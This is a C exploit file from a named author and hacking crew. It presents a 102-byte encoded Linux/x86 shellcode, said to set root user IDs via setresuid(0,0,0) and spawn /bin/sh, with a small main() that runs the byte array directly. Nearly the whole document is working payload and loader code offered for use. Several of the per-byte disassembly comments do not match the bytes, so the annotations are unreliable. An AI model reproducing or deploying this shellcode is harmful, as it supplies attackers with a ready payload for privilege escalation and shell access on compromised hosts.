/*
###
# Title : linux/x86 sys_execve ["/bin/sh"] setresuid(0,0,0) exit(0) - 102 bytes (coded)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
# Web Site : www.1337day.com * sec4ever.com * r00tw0rm.com
# Facebook : http://facebook.com/KedAns
# platform : linux/x86
# Type : Shellcode - 102 Bytes (encoded)
# Tested on : Linux.(Ubuntu 10.10) En
###

##
# I'm BaCk fr0m OURHOUD ^__^ .. I m!Ss tHe Explo!tInG <3 <3 ^_*
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
# | KinG Of PiraTeS * The g0bl!n * soucha * dr.R!dE  .. |
# | ------------------------------------------------- < |
##

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
char sc[] =
"\x31\xDB"          // xor %ebx,%ebx
"\x8D\x43\x0D"      // lea %eax,%ebx
"\xCD\x80"          // int $0x80
"\x66\x31\xC0"      // xor %ax,%ax
"\xDB\xD1"          // fcmovne %st,%st
"\x33\xC9"          // xor %ecx,%ecx
"\xB1\x11"          // mov %cl,$0x11
"\xD9\x74\x24\xF4"    // fstenv %esp
"\x5B"              // pop %ebx
"\x83\xC3\x04"      // add %ebx,$0x04
"\x31\x43\x11"      // xor dword %ebx $0x11,%eax
"\x03\x43\x11"      // add %eax,dword %ebx $0x11
"\xE2\xF5"          // loopd short (from me)
"\x31\xC9"          //  xor %ecx,%ecx
"\x31\x2E\xC6"      // xor dword %esi,%ebp 
"\x2A\x81\x74\xE4\x2D\x88"  // sub al,%ecx $0x882DE474
"\xAF"              // scas dword,%edi
"\x9D"              // popfd
"\x3A\x4C\x82\xE2"  // cmp %cl,%edx,%eax
"\x2F"              // das
"\x67\x44"          // inc %esp
"\x7A\xFD"          // jpe short (from me)
"\x11\x1C\x51"      // adc dword %ecx,%edx,%ebx
"\x61"              // popad
"\x57"              // push %edi
"\x3B\xC1"          // cmp %eax,%ecx
"\x4A"              // dec %edx
"\x14\xAB"          // adc %al,$0xAB
"\x12\xFD"          // adc %bh,%ch
"\xF5"              // cmc
"\x49"              // dec %ecx
"\x7A\x93"          // jpe short (me)
"\x80\x6E\x2E\x83"  // sub %esi,$0x2E,$0x83
"\x9B"              // wait
"\x70\xCF"          // jo short (me)
"\x53"              // push %ebx
"\xB3\x12"          // mov %bl,$0x12
"\xA6"              // cmps %esi,%edi
"\x3D\xE4\xA1\x50\xC2"  // cmp %eax,$0xC250A1E4
"\xAD"              // lods dword %esi
"\x16"              // push ss
"\x28\x23"          // sub %ebx,%ah
"\x9C"              // pushfd
"\x18\x1B"          // sbb %ebx,%bl
"\x7F\x75"          // jg short
"\x19\x04\xB2"      // sbb dword %edx %esi,%eax
"\x0A\x00";         // or %al,%eax

int main()
{
    int (*dz)() = (int(*)())sc;
        printf("bytes: %u\n", strlen(sc));
        dz();
}
